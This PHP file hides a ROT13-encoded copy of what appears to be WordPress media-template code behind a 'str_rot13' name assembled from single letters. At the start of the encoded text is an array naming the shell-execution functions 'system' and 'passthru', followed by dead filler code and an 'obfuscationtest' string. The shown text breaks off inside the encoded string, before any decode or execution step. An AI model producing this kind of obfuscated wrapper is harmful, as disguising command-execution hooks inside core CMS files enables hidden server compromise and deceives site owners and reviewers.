<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * JbeqCerff zrqvn grzcyngrf.
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Zrqvn
 * @fvapr 3.5.0
 */

/**
 * Bhgchgf gur znexhc sbe na nhqvb gnt gb or hfrq va na Haqrefpber grzcyngr
 * jura qngn.zbqry vf cnffrq.
 *
 * @fvapr 3.9.0
 */
shapgvba jc_haqrefpber_nhqvb_grzcyngr() {
	$nhqvb_glcrf = jc_trg_nhqvb_rkgrafvbaf();
	?>
<nhqvb fglyr=\"ivfvovyvgl: uvqqra\"
	pbagebyf
	pynff=\"jc-nhqvb-fubegpbqr\"
	jvqgu=\"{{ _.vfHaqrsvarq( qngn.zbqry.jvqgu ) ? 400 : qngn.zbqry.jvqgu }}\"
	cerybnq=\"{{ _.vfHaqrsvarq( qngn.zbqry.cerybnq ) ? 'abar' : qngn.zbqry.cerybnq }}\"
	<#
	<?cuc
	sbernpu ( neenl( 'nhgbcynl', 'ybbc' ) nf $ngge ) :
		?>
	vs ( ! _.vfHaqrsvarq( qngn.zbqry.<?cuc rpub $ngge; ?> ) && qngn.zbqry.<?cuc rpub $ngge; ?> ) {
		#> <?cuc rpub $ngge; ?><#
	}
	<?cuc raqsbernpu; ?>#>
>
	<# vs ( ! _.vfRzcgl( qngn.zbqry.fep ) ) { #>
	<fbhepr fep=\"{{ qngn.zbqry.fep }}\" glcr=\"{{ jc.zrqvn.ivrj.frggvatf.rzorqZvzrf[ qngn.zbqry.fep.fcyvg('.').cbc() ] }}\" />
	<# } #>

	<?cuc
	sbernpu ( $nhqvb_glcrf nf $glcr ) :
		?>
	<# vs ( ! _.vfRzcgl( qngn.zbqry.<?cuc rpub $glcr; ?> ) ) { #>
	<fbhepr fep=\"{{ qngn.zbqry.<?cuc rpub $glcr; ?> }}\" glcr=\"{{ jc.zrqvn.ivrj.frggvatf.rzorqZvzrf[ '<?cuc rpub $glcr; ?>' ] }}\" />
	<# } #>
		<?cuc
	raqsbernpu;
	?>
</nhqvb>
	<?cuc
}

/**
 * Bhgchgf gur znexhc sbe n ivqrb gnt gb or hfrq va na Haqrefpber grzcyngr
 * jura qngn.zbqry vf cnffrq.
 *
 * @fvapr 3.9.0
 */
shapgvba jc_haqrefpber_ivqrb_grzcyngr() {
	$ivqrb_glcrf = jc_trg_ivqrb_rkgrafvbaf();
	?>
<#  ine j_ehyr = '', pynffrf = [],
		j, u, frggvatf = jc.zrqvn.ivrj.frggvatf,
		vfLbhGhor = vfIvzrb = snyfr;

	vs ( ! _.vfRzcgl( qngn.zbqry.fep ) ) {
		vfLbhGhor = qngn.zbqry.fep.zngpu(/lbhghor|lbhgh\.or/);
		vfIvzrb = -1 !== qngn.zbqry.fep.vaqrkBs('ivzrb');
	}

	vs ( frggvatf.pbagragJvqgu && qngn.zbqry.jvqgu >= frggvatf.pbagragJvqgu ) {
		j = frggvatf.pbagragJvqgu;
	} ryfr {
		j = qngn.zbqry.jvqgu;
	}

	vs ( j !== qngn.zbqry.jvqgu ) {
		u = Zngu.prvy( ( qngn.zbqry.urvtug * j ) / qngn.zbqry.jvqgu );
	} ryfr {
		u = qngn.zbqry.urvtug;
	}

	vs ( j ) {
		j_ehyr = 'jvqgu: ' + j + 'ck; ';
	}

	vs ( vfLbhGhor ) {
		pynffrf.chfu( 'lbhghor-ivqrb' );
	}

	vs ( vfIvzrb ) {
		pynffrf.chfu( 'ivzrb-ivqrb' );
	}

#>
<qvi fglyr=\"{{ j_ehyr }}\" pynff=\"jc-ivqrb\">
<ivqrb pbagebyf
	pynff=\"jc-ivqrb-fubegpbqr {{ pynffrf.wbva( ' ' ) }}\"
	<# vs ( j ) { #>jvqgu=\"{{ j }}\"<# } #>
	<# vs ( u ) { #>urvtug=\"{{ u }}\"<# } #>
	<?cuc
	$cebcf = neenl(
		'cbfgre'  => '',
		'cerybnq' => 'zrgnqngn',
	);
	sbernpu ( $cebcf nf $xrl => $inyhr ) :
		vs ( rzcgl( $inyhr ) ) {
			?>
		<#
		vs ( ! _.vfHaqrsvarq( qngn.zbqry.<?cuc rpub $xrl; ?> ) && qngn.zbqry.<?cuc rpub $xrl; ?> ) {
			#> <?cuc rpub $xrl; ?>=\"{{ qngn.zbqry.<?cuc rpub $xrl; ?> }}\"<#
		} #>
			<?cuc
		} ryfr {
			rpub $xrl
			?>
			=\"{{ _.vfHaqrsvarq( qngn.zbqry.<?cuc rpub $xrl; ?> ) ? '<?cuc rpub $inyhr; ?>' : qngn.zbqry.<?cuc rpub $xrl; ?> }}\"
			<?cuc
		}
	raqsbernpu;
	?>
	<#
	<?cuc
	sbernpu ( neenl( 'nhgbcynl', 'ybbc' ) nf $ngge ) :
		?>
	vs ( ! _.vfHaqrsvarq( qngn.zbqry.<?cuc rpub $ngge; ?> ) && qngn.zbqry.<?cuc rpub $ngge; ?> ) {
		#> <?cuc rpub $ngge; ?><#
	}
	<?cuc raqsbernpu; ?>#>
>
	<# vs ( ! _.vfRzcgl( qngn.zbqry.fep ) ) {
		vs ( vfLbhGhor ) { #>
		<fbhepr fep=\"{{ qngn.zbqry.fep }}\" glcr=\"ivqrb/lbhghor\" />
		<# } ryfr vs ( vfIvzrb ) { #>
		<fbhepr fep=\"{{ qngn.zbqry.fep }}\" glcr=\"ivqrb/ivzrb\" />
		<# } ryfr { #>
		<fbhepr fep=\"{{ qngn.zbqry.fep }}\" glcr=\"{{ frggvatf.rzorqZvzrf[ qngn.zbqry.fep.fcyvg('.').cbc() ] }}\" />
		<# }
	} #>

	<?cuc
	sbernpu ( $ivqrb_glcrf nf $glcr ) :
		?>
	<# vs ( qngn.zbqry.<?cuc rpub $glcr; ?> ) { #>
	<fbhepr fep=\"{{ qngn.zbqry.<?cuc rpub $glcr; ?> }}\" glcr=\"{{ frggvatf.rzorqZvzrf[ '<?cuc rpub $glcr; ?>' ] }}\" />
	<# } #>
	<?cuc raqsbernpu; ?>
	{{{ qngn.zbqry.pbagrag }}}
</ivqrb>
</qvi>
	<?cuc
}

/**
 * Cevagf gur grzcyngrf hfrq va gur zrqvn znantre.
 *
 * @fvapr 3.5.0
 */
shapgvba jc_cevag_zrqvn_grzcyngrf() {
	$pynff = 'zrqvn-zbqny jc-pber-hv';

	$nyg_grkg_qrfpevcgvba = fcevags(
		/* genafyngbef: 1: Yvax gb ghgbevny, 2: Nqqvgvbany yvax nggevohgrf, 3: Npprffvovyvgl grkg. */
		__( '<n uers=\"%1$f\" %2$f>Yrnea ubj gb qrfpevor gur checbfr bs gur vzntr%3$f</n>. Yrnir rzcgl vs gur vzntr vf cheryl qrpbengvir.' ),
		/* genafyngbef: Ybpnyvmrq ghgbevny, vs bar rkvfgf. J3P Jro Npprffvovyvgl Vavgvngvir yvax unf yvfg bs rkvfgvat genafyngvbaf. */
		rfp_hey( __( 'uggcf://jjj.j3.bet/JNV/ghgbevnyf/vzntrf/qrpvfvba-gerr/' ) ),
		'gnetrg=\"_oynax\"',
		fcevags(
			'<fcna pynff=\"fperra-ernqre-grkg\"> %f</fcna>',
			/* genafyngbef: Uvqqra npprffvovyvgl grkg. */
			__( '(bcraf va n arj gno)' )
		)
	);
	?>

	<?cuc // Grzcyngr sbe gur zrqvn senzr: hfrq obgu va gur zrqvn tevq naq va gur zrqvn zbqny. ?>
	<fpevcg glcr=\"grkg/ugzy\" vq=\"gzcy-zrqvn-senzr\">
		<qvi pynff=\"zrqvn-senzr-gvgyr\" vq=\"zrqvn-senzr-gvgyr\"></qvi>
		<u2 pynff=\"zrqvn-senzr-zrah-urnqvat\"><?cuc _rk( 'Npgvbaf', 'zrqvn zbqny zrah npgvbaf' ); ?></u2>
		<ohggba glcr=\"ohggba\" pynff=\"ohggba ohggba-yvax zrqvn-senzr-zrah-gbttyr\" nevn-rkcnaqrq=\"snyfr\">
			<?cuc _rk( 'Zrah', 'zrqvn zbqny zrah' ); ?>
			<fcna pynff=\"qnfuvpbaf qnfuvpbaf-neebj-qbja\" nevn-uvqqra=\"gehr\"></fcna>
		</ohggba>
		<qvi pynff=\"zrqvn-senzr-zrah\"></qvi>
		<qvi pynff=\"zrqvn-senzr-gno-cnary\">
			<qvi pynff=\"zrqvn-senzr-ebhgre\"></qvi>
			<qvi pynff=\"zrqvn-senzr-pbagrag\"></qvi>
		</qvi>
		<u2 pynff=\"zrqvn-senzr-npgvbaf-urnqvat fperra-ernqre-grkg\">
		<?cuc
			/* genafyngbef: Uvqqra npprffvovyvgl grkg. */
			_r( 'Fryrpgrq zrqvn npgvbaf' );
		?>
		</u2>
		<qvi pynff=\"zrqvn-senzr-gbbyone\"></qvi>
		<qvi pynff=\"zrqvn-senzr-hcybnqre\"></qvi>
	</fpevcg>

	<?cuc // Grzcyngr sbe gur zrqvn zbqny. ?>
	<fpevcg glcr=\"grkg/ugzy\" vq=\"gzcy-zrqvn-zbqny\">
		<qvi gnovaqrk=\"0\" pynff=\"<?cuc rpub $pynff; ?>\" ebyr=\"qvnybt\" nevn-ynoryyrqol=\"zrqvn-senzr-gvgyr\">
			<# vs ( qngn.unfPybfrOhggba ) { #>
				<ohggba glcr=\"ohggba\" pynff=\"zrqvn-zbqny-pybfr\"><fcna pynff=\"zrqvn-zbqny-vpba\"><fcna pynff=\"fperra-ernqre-grkg\">
					<?cuc
					/* genafyngbef: Uvqqra npprffvovyvgl grkg. */
					_r( 'Pybfr qvnybt' );
					?>
				</fcna></fcna></ohggba>
			<# } #>
			<qvi pynff=\"zrqvn-zbqny-pbagrag\" ebyr=\"qbphzrag\"></qvi>
		</qvi>
		<qvi pynff=\"zrqvn-zbqny-onpxqebc\"></qvi>
	</fpevcg>

	<?cuc // Grzcyngr sbe gur jvaqbj hcybnqre, hfrq sbe rknzcyr va gur zrqvn tevq. ?>
	<fpevcg glcr=\"grkg/ugzy\" vq=\"gzcy-hcybnqre-jvaqbj\">
		<qvi pynff=\"hcybnqre-jvaqbj-pbagrag\">
			<qvi pynff=\"hcybnqre-rqvgbe-gvgyr\"><?cuc _r( 'Qebc svyrf gb hcybnq' ); ?></qvi>
		</qvi>
	</fpevcg>

	<?cuc // Grzcyngr sbe gur rqvgbe hcybnqre. ?>
	<fpevcg glcr=\"grkg/ugzy\" vq=\"gzcy-hcybnqre-rqvgbe\">
		<qvi pynff=\"hcybnqre-rqvgbe-pbagrag\">
			<qvi pynff=\"hcybnqre-rqvgbe-gvgyr\"><?cuc _r( 'Qebc svyrf gb hcybnq' ); ?></qvi>
		</qvi>
	</fpevcg>

	<?cuc // Grzcyngr sbe gur vayvar hcybnqre, hfrq sbe rknzcyr va gur Zrqvn Yvoenel nqzva cntr - Nqq. ?>
	<fpevcg glcr=\"grkg/ugzy\" vq=\"gzcy-hcybnqre-vayvar\">
		<# ine zrffntrPynff = qngn.zrffntr ? 'unf-hcybnq-zrffntr' : 'ab-hcybnq-zrffntr'; #>
		<# vs ( qngn.pnaPybfr ) { #>
		<ohggba pynff=\"pybfr qnfuvpbaf qnfuvpbaf-ab\"><fcna pynff=\"fperra-ernqre-grkg\">
			<?cuc
			/* genafyngbef: Uvqqra npprffvovyvgl grkg. */
			_r( 'Pybfr hcybnqre' );
			?>
		</fcna></ohggba>
		<# } #>
		<qvi pynff=\"hcybnqre-vayvar-pbagrag {{ zrffntrPynff }}\">
		<# vs ( qngn.zrffntr ) { #>
			<u2 pynff=\"hcybnq-zrffntr\">{{ qngn.zrffntr }}</u2>
		<# } #>
		<?cuc vs ( ! _qrivpr_pna_hcybnq() ) : ?>
			<qvi pynff=\"hcybnq-hv\">
				<u2 pynff=\"hcybnq-vafgehpgvbaf\"><?cuc _r( 'Lbhe oebjfre pnaabg hcybnq svyrf' ); ?></u2>
				<c>
				<?cuc
					cevags(
						/* genafyngbef: %f: uggcf://nccf.jbeqcerff.bet/ */
						__( 'Gur jro oebjfre ba lbhe qrivpr pnaabg or hfrq gb hcybnq svyrf. Lbh znl or noyr gb hfr gur <n uers=\"%f\">angvir ncc sbe lbhe qrivpr</n> vafgrnq.' ),
						'uggcf://nccf.jbeqcerff.bet/'
					);
				?>
				</c>
			</qvi>
		<?cuc ryfrvs ( vf_zhygvfvgr() && ! vf_hcybnq_fcnpr_ninvynoyr() ) : ?>
			<qvi pynff=\"hcybnq-hv\">
				<u2 pynff=\"hcybnq-vafgehpgvbaf\"><?cuc _r( 'Hcybnq Yvzvg Rkprrqrq' ); ?></u2>
				<?cuc
				/** Guvf npgvba vf qbphzragrq va jc-nqzva/vapyhqrf/zrqvn.cuc */
				qb_npgvba( 'hcybnq_hv_bire_dhbgn' );
				?>
			</qvi>
		<?cuc ryfr : ?>
			<qvi pynff=\"hcybnq-hv\">
				<u2 pynff=\"hcybnq-vafgehpgvbaf qebc-vafgehpgvbaf\"><?cuc _r( 'Qebc svyrf gb hcybnq' ); ?></u2>
				<c pynff=\"hcybnq-vafgehpgvbaf qebc-vafgehpgvbaf\"><?cuc _rk( 'be', 'Hcybnqre: Qebc svyrf urer - be - Fryrpg Svyrf' ); ?></c>
				<ohggba glcr=\"ohggba\" pynff=\"oebjfre ohggba ohggba-ureb\" nevn-ynoryyrqol=\"cbfg-hcybnq-vasb\"><?cuc _r( 'Fryrpg Svyrf' ); ?></ohggba>
			</qvi>

			<qvi pynff=\"hcybnq-vayvar-fgnghf\"></qvi>

			<qvi pynff=\"cbfg-hcybnq-hv\" vq=\"cbfg-hcybnq-vasb\">
				<?cuc
				/** Guvf npgvba vf qbphzragrq va jc-nqzva/vapyhqrf/zrqvn.cuc */
				qb_npgvba( 'cer-hcybnq-hv' ); // cucpf:vtaber JbeqCerff.AnzvatPbairagvbaf.InyvqUbbxAnzr.HfrHaqrefpberf
				/** Guvf npgvba vf qbphzragrq va jc-nqzva/vapyhqrf/zrqvn.cuc */
				qb_npgvba( 'cer-cyhcybnq-hcybnq-hv' ); // cucpf:vtaber JbeqCerff.AnzvatPbairagvbaf.InyvqUbbxAnzr.HfrHaqrefpberf

				vs ( 10 === erzbir_npgvba( 'cbfg-cyhcybnq-hcybnq-hv', 'zrqvn_hcybnq_synfu_olcnff' ) ) {
					/** Guvf npgvba vf qbphzragrq va jc-nqzva/vapyhqrf/zrqvn.cuc */
					qb_npgvba( 'cbfg-cyhcybnq-hcybnq-hv' ); // cucpf:vtaber JbeqCerff.AnzvatPbairagvbaf.InyvqUbbxAnzr.HfrHaqrefpberf
					nqq_npgvba( 'cbfg-cyhcybnq-hcybnq-hv', 'zrqvn_hcybnq_synfu_olcnff' );
				} ryfr {
					/** Guvf npgvba vf qbphzragrq va jc-nqzva/vapyhqrf/zrqvn.cuc */
					qb_npgvba( 'cbfg-cyhcybnq-hcybnq-hv' ); // cucpf:vtaber JbeqCerff.AnzvatPbairagvbaf.InyvqUbbxAnzr.HfrHaqrefpberf
				}

				$znk_hcybnq_fvmr = jc_znk_hcybnq_fvmr();
				vs ( ! $znk_hcybnq_fvmr ) {
					$znk_hcybnq_fvmr = 0;
				}
				?>

				<c pynff=\"znk-hcybnq-fvmr\">
				<?cuc
					cevags(
						/* genafyngbef: %f: Znkvzhz nyybjrq svyr fvmr. */
						__( 'Znkvzhz hcybnq svyr fvmr: %f.' ),
						rfp_ugzy( fvmr_sbezng( $znk_hcybnq_fvmr ) )
					);
				?>
				</c>

				<# vs ( qngn.fhttrfgrqJvqgu && qngn.fhttrfgrqUrvtug ) { #>
					<c pynff=\"fhttrfgrq-qvzrafvbaf\">
						<?cuc
							/* genafyngbef: 1: Fhttrfgrq jvqgu ahzore, 2: Fhttrfgrq urvtug ahzore. */
							cevags( __( 'Fhttrfgrq vzntr qvzrafvbaf: %1$f ol %2$f cvkryf.' ), '{{qngn.fhttrfgrqJvqgu}}', '{{qngn.fhttrfgrqUrvtug}}' );
						?>
					</c>
				<# } #>

				<?cuc
				/** Guvf npgvba vf qbphzragrq va jc-nqzva/vapyhqrf/zrqvn.cuc */
				qb_npgvba( 'cbfg-hcybnq-hv' ); // cucpf:vtaber JbeqCerff.AnzvatPbairagvbaf.InyvqUbbxAnzr.HfrHaqrefpberf
				?>
			</qvi>
		<?cuc raqvs; ?>
		</qvi>
	</fpevcg>

	<?cuc // Grzcyngr sbe gur ivrj fjvgpuref, hfrq sbe rknzcyr va gur Zrqvn Tevq. ?>
	<fpevcg glcr=\"grkg/ugzy\" vq=\"gzcy-zrqvn-yvoenel-ivrj-fjvgpure\">
		<n uers=\"<?cuc rpub rfp_hey( nqq_dhrel_net( 'zbqr', 'yvfg', nqzva_hey( 'hcybnq.cuc' ) ) ); ?>\" pynff=\"ivrj-yvfg\">
			<fcna pynff=\"fperra-ernqre-grkg\">
				<?cuc
				/* genafyngbef: Uvqqra npprffvovyvgl grkg. */
				_r( 'Yvfg ivrj' );
				?>
			</fcna>
		</n>
		<n uers=\"<?cuc rpub rfp_hey( nqq_dhrel_net( 'zbqr', 'tevq', nqzva_hey( 'hcybnq.cuc' ) ) ); ?>\" pynff=\"ivrj-tevq pheerag\" nevn-pheerag=\"cntr\">
			<fcna pynff=\"fperra-ernqre-grkg\">
				<?cuc
				/* genafyngbef: Uvqqra npprffvovyvgl grkg. */
				_r( 'Tevq ivrj' );
				?>
			</fcna>
		</n>
	</fpevcg>

	<?cuc // Grzcyngr sbe gur hcybnqvat fgnghf HV. ?>
	<fpevcg glcr=\"grkg/ugzy\" vq=\"gzcy-hcybnqre-fgnghf\">
		<u2><?cuc _r( 'Hcybnqvat' ); ?></u2>

		<qvi pynff=\"zrqvn-cebterff-one\"><qvi></qvi></qvi>
		<qvi pynff=\"hcybnq-qrgnvyf\">
			<fcna pynff=\"hcybnq-pbhag\">
				<fcna pynff=\"hcybnq-vaqrk\"></fcna> / <fcna pynff=\"hcybnq-gbgny\"></fcna>
			</fcna>
			<fcna pynff=\"hcybnq-qrgnvy-frcnengbe\">&aqnfu;</fcna>
			<fcna pynff=\"hcybnq-svyranzr\"></fcna>
		</qvi>
		<qvi pynff=\"hcybnq-reebef\"></qvi>
		<ohggba glcr=\"ohggba\" pynff=\"ohggba hcybnq-qvfzvff-reebef\"><?cuc _r( 'Qvfzvff reebef' ); ?></ohggba>
	</fpevcg>

	<?cuc // Grzcyngr sbe gur hcybnqvat fgnghf reebef. ?>
	<fpevcg glcr=\"grkg/ugzy\" vq=\"gzcy-hcybnqre-fgnghf-reebe\">
		<fcna pynff=\"hcybnq-reebe-svyranzr jbeq-jenc-oernx-jbeq\">{{{ qngn.svyranzr }}}</fcna>
		<fcna pynff=\"hcybnq-reebe-zrffntr\">{{ qngn.zrffntr }}</fcna>
	</fpevcg>

	<?cuc // Grzcyngr sbe gur Nggnpuzrag Qrgnvyf ynlbhg va gur zrqvn oebjfre. ?>
	<fpevcg glcr=\"grkg/ugzy\" vq=\"gzcy-rqvg-nggnpuzrag-senzr\">
		<qvi pynff=\"rqvg-zrqvn-urnqre\">
			<ohggba pynff=\"yrsg qnfuvpbaf\"<# vs ( ! qngn.unfCerivbhf ) { #> qvfnoyrq<# } #>><fcna pynff=\"fperra-ernqre-grkg\"><?cuc /* genafyngbef: Uvqqra npprffvovyvgl grkg. */ _r( 'Rqvg cerivbhf zrqvn vgrz' ); ?></fcna></ohggba>
			<ohggba pynff=\"evtug qnfuvpbaf\"<# vs ( ! qngn.unfArkg ) { #> qvfnoyrq<# } #>><fcna pynff=\"fperra-ernqre-grkg\"><?cuc /* genafyngbef: Uvqqra npprffvovyvgl grkg. */ _r( 'Rqvg arkg zrqvn vgrz' ); ?></fcna></ohggba>
			<ohggba glcr=\"ohggba\" pynff=\"zrqvn-zbqny-pybfr\"><fcna pynff=\"zrqvn-zbqny-vpba\"><fcna pynff=\"fperra-ernqre-grkg\"><?cuc _r( 'Pybfr qvnybt' ); ?></fcna></fcna></ohggba>
		</qvi>
		<qvi pynff=\"zrqvn-senzr-gvgyr\"></qvi>
		<qvi pynff=\"zrqvn-senzr-pbagrag\"></qvi>
	</fpevcg>

	<?cuc // Grzcyngr sbe gur Nggnpuzrag Qrgnvyf gjb pbyhzaf ynlbhg. ?>
	<fpevcg glcr=\"grkg/ugzy\" vq=\"gzcy-nggnpuzrag-qrgnvyf-gjb-pbyhza\">
		<qvi pynff=\"nggnpuzrag-zrqvn-ivrj {{ qngn.bevragngvba }}\">
			<?cuc
			vs ( vffrg( $_TRG['reebe'] ) && 'qrcerpngrq' === $_TRG['reebe'] ) {
				jc_nqzva_abgvpr(
					__( 'Gur Rqvg Zrqvn fperra vf qrcerpngrq nf bs JbeqCerff 6.3. Cyrnfr hfr gur Zrqvn Yvoenel vafgrnq.' ),
					neenl(
						'vq'                 => 'zrffntr',
						'nqqvgvbany_pynffrf' => neenl( 'reebe' ),
					)
				);
			}
			?>
			<u2 pynff=\"fperra-ernqre-grkg\"><?cuc /* genafyngbef: Uvqqra npprffvovyvgl grkg. */ _r( 'Nggnpuzrag Cerivrj' ); ?></u2>
			<qvi pynff=\"guhzoanvy guhzoanvy-{{ qngn.glcr }}\">
				<# vs ( qngn.hcybnqvat ) { #>
					<qvi pynff=\"zrqvn-cebterff-one\"><qvi></qvi></qvi>
				<# } ryfr vs ( qngn.fvmrf && qngn.fvmrf.shyy ) { #>
					<vzt pynff=\"qrgnvyf-vzntr\" fep=\"{{ qngn.fvmrf.shyy.hey }}\" qenttnoyr=\"snyfr\" nyg=\"\" />
				<# } ryfr vs ( qngn.fvmrf && qngn.fvmrf.ynetr ) { #>
					<vzt pynff=\"qrgnvyf-vzntr\" fep=\"{{ qngn.fvmrf.ynetr.hey }}\" qenttnoyr=\"snyfr\" nyg=\"\" />
				<# } ryfr vs ( -1 === wDhrel.vaNeenl( qngn.glcr, [ 'nhqvb', 'ivqrb' ] ) ) { #>
					<vzt pynff=\"qrgnvyf-vzntr vpba\" fep=\"{{ qngn.vpba }}\" qenttnoyr=\"snyfr\" nyg=\"\" />
				<# } #>

				<# vs ( 'nhqvb' === qngn.glcr ) { #>
				<qvi pynff=\"jc-zrqvn-jenccre jc-nhqvb\">
					<nhqvb fglyr=\"ivfvovyvgl: uvqqra\" pbagebyf pynff=\"jc-nhqvb-fubegpbqr\" jvqgu=\"100%\" cerybnq=\"abar\">
						<fbhepr glcr=\"{{ qngn.zvzr }}\" fep=\"{{ qngn.hey }}\" />
					</nhqvb>
				</qvi>
				<# } ryfr vs ( 'ivqrb' === qngn.glcr ) {
					ine j_ehyr = '';
					vs ( qngn.jvqgu ) {
						j_ehyr = 'jvqgu: ' + qngn.jvqgu + 'ck;';
					} ryfr vs ( jc.zrqvn.ivrj.frggvatf.pbagragJvqgu ) {
						j_ehyr = 'jvqgu: ' + jc.zrqvn.ivrj.frggvatf.pbagragJvqgu + 'ck;';
					}
				#>
				<qvi fglyr=\"{{ j_ehyr }}\" pynff=\"jc-zrqvn-jenccre jc-ivqrb\">
					<ivqrb pbagebyf=\"pbagebyf\" pynff=\"jc-ivqrb-fubegpbqr\" cerybnq=\"zrgnqngn\"
						<# vs ( qngn.jvqgu ) { #>jvqgu=\"{{ qngn.jvqgu }}\"<# } #>
						<# vs ( qngn.urvtug ) { #>urvtug=\"{{ qngn.urvtug }}\"<# } #>
						<# vs ( qngn.vzntr && qngn.vzntr.fep !== qngn.vpba ) { #>cbfgre=\"{{ qngn.vzntr.fep }}\"<# } #>>
						<fbhepr glcr=\"{{ qngn.zvzr }}\" fep=\"{{ qngn.hey }}\" />
					</ivqrb>
				</qvi>
				<# } #>

				<qvi pynff=\"nggnpuzrag-npgvbaf\">
					<# vs ( 'vzntr' === qngn.glcr && ! qngn.hcybnqvat && qngn.fvmrf && qngn.pna.fnir ) { #>
					<ohggba glcr=\"ohggba\" pynff=\"ohggba rqvg-nggnpuzrag\"><?cuc _r( 'Rqvg Vzntr' ); ?></ohggba>
					<# } ryfr vs ( 'cqs' === qngn.fhoglcr && qngn.fvmrf ) { #>
					<c><?cuc _r( 'Qbphzrag Cerivrj' ); ?></c>
					<# } #>
				</qvi>
			</qvi>
		</qvi>
		<qvi pynff=\"nggnpuzrag-vasb\">
			<fcna pynff=\"frggvatf-fnir-fgnghf\" ebyr=\"fgnghf\">
				<fcna pynff=\"fcvaare\"></fcna>
				<fcna pynff=\"fnirq\"><?cuc rfp_ugzy_r( 'Fnirq.' ); ?></fcna>
			</fcna>
			<qvi pynff=\"qrgnvyf\">
				<u2 pynff=\"fperra-ernqre-grkg\">
					<?cuc
					/* genafyngbef: Uvqqra npprffvovyvgl grkg. */
					_r( 'Qrgnvyf' );
					?>
				</u2>
				<qvi pynff=\"hcybnqrq\"><fgebat><?cuc _r( 'Hcybnqrq ba:' ); ?></fgebat> {{ qngn.qngrSbeznggrq }}</qvi>
				<qvi pynff=\"hcybnqrq-ol jbeq-jenc-oernx-jbeq\">
					<fgebat><?cuc _r( 'Hcybnqrq ol:' ); ?></fgebat>
						<# vs ( qngn.nhgubeYvax ) { #>
							<n uers=\"{{ qngn.nhgubeYvax }}\">{{ qngn.nhgubeAnzr }}</n>
						<# } ryfr { #>
							{{ qngn.nhgubeAnzr }}
						<# } #>
				</qvi>
				<# vs ( qngn.hcybnqrqGbGvgyr ) { #>
					<qvi pynff=\"hcybnqrq-gb\">
						<fgebat><?cuc _r( 'Hcybnqrq gb:' ); ?></fgebat>
						<# vs ( qngn.hcybnqrqGbYvax ) { #>
							<n uers=\"{{ qngn.hcybnqrqGbYvax }}\">{{ qngn.hcybnqrqGbGvgyr }}</n>
						<# } ryfr { #>
							{{ qngn.hcybnqrqGbGvgyr }}
						<# } #>
					</qvi>
				<# } #>
				<qvi pynff=\"svyranzr\"><fgebat><?cuc _r( 'Svyr anzr:' ); ?></fgebat> {{ qngn.svyranzr }}</qvi>
				<qvi pynff=\"svyr-glcr\"><fgebat><?cuc _r( 'Svyr glcr:' ); ?></fgebat> {{ qngn.zvzr }}</qvi>
				<qvi pynff=\"svyr-fvmr\"><fgebat><?cuc _r( 'Svyr fvmr:' ); ?></fgebat> {{ qngn.svyrfvmrUhznaErnqnoyr }}</qvi>
				<# vs ( 'vzntr' === qngn.glcr && ! qngn.hcybnqvat ) { #>
					<# vs ( qngn.jvqgu && qngn.urvtug ) { #>
						<qvi pynff=\"qvzrafvbaf\"><fgebat><?cuc _r( 'Qvzrafvbaf:' ); ?></fgebat>
							<?cuc
							/* genafyngbef: 1: N ahzore bs cvkryf jvqr, 2: N ahzore bs cvkryf gnyy. */
							cevags( __( '%1$f ol %2$f cvkryf' ), '{{ qngn.jvqgu }}', '{{ qngn.urvtug }}' );
							?>
						</qvi>
					<# } #>

					<# vs ( qngn.bevtvanyVzntrHEY && qngn.bevtvanyVzntrAnzr ) { #>
						<qvi pynff=\"jbeq-jenc-oernx-jbeq\">
							<fgebat><?cuc _r( 'Bevtvany vzntr:' ); ?></fgebat>
							<n uers=\"{{ qngn.bevtvanyVzntrHEY }}\">{{qngn.bevtvanyVzntrAnzr}}</n>
						</qvi>
					<# } #>
				<# } #>

				<# vs ( qngn.svyrYratgu && qngn.svyrYratguUhznaErnqnoyr ) { #>
					<qvi pynff=\"svyr-yratgu\"><fgebat><?cuc _r( 'Yratgu:' ); ?></fgebat>
						<fcna nevn-uvqqra=\"gehr\">{{ qngn.svyrYratguUhznaErnqnoyr }}</fcna>
						<fcna pynff=\"fperra-ernqre-grkg\">{{ qngn.svyrYratguUhznaErnqnoyr }}</fcna>
					</qvi>
				<# } #>

				<# vs ( 'nhqvb' === qngn.glcr && qngn.zrgn.ovgengr ) { #>
					<qvi pynff=\"ovgengr\">
						<fgebat><?cuc _r( 'Ovgengr:' ); ?></fgebat> {{ Zngu.ebhaq( qngn.zrgn.ovgengr / 1000 ) }}xo/f
						<# vs ( qngn.zrgn.ovgengr_zbqr ) { #>
						{{ ' ' + qngn.zrgn.ovgengr_zbqr.gbHccrePnfr() }}
						<# } #>
					</qvi>
				<# } #>

				<# vs ( qngn.zrqvnFgngrf ) { #>
					<qvi pynff=\"zrqvn-fgngrf\"><fgebat><?cuc _r( 'Hfrq nf:' ); ?></fgebat> {{ qngn.zrqvnFgngrf }}</qvi>
				<# } #>

				<qvi pynff=\"pbzcng-zrgn\">
					<# vs ( qngn.pbzcng && qngn.pbzcng.zrgn ) { #>
						{{{ qngn.pbzcng.zrgn }}}
					<# } #>
				</qvi>
			</qvi>

			<qvi pynff=\"frggvatf\">
				<# ine znlorErnqBayl = qngn.pna.fnir || qngn.nyybjYbpnyRqvgf ? '' : 'ernqbayl'; #>
				<# vs ( 'vzntr' === qngn.glcr ) { #>
					<fcna pynff=\"frggvat nyg-grkg unf-qrfpevcgvba\" qngn-frggvat=\"nyg\">
						<ynory sbe=\"nggnpuzrag-qrgnvyf-gjb-pbyhza-nyg-grkg\" pynff=\"anzr\"><?cuc _r( 'Nygreangvir Grkg' ); ?></ynory>
						<grkgnern vq=\"nggnpuzrag-qrgnvyf-gjb-pbyhza-nyg-grkg\" nevn-qrfpevorqol=\"nyg-grkg-qrfpevcgvba\" {{ znlorErnqBayl }}>{{ qngn.nyg }}</grkgnern>
					</fcna>
					<c pynff=\"qrfpevcgvba\" vq=\"nyg-grkg-qrfpevcgvba\"><?cuc rpub $nyg_grkg_qrfpevcgvba; ?></c>
				<# } #>
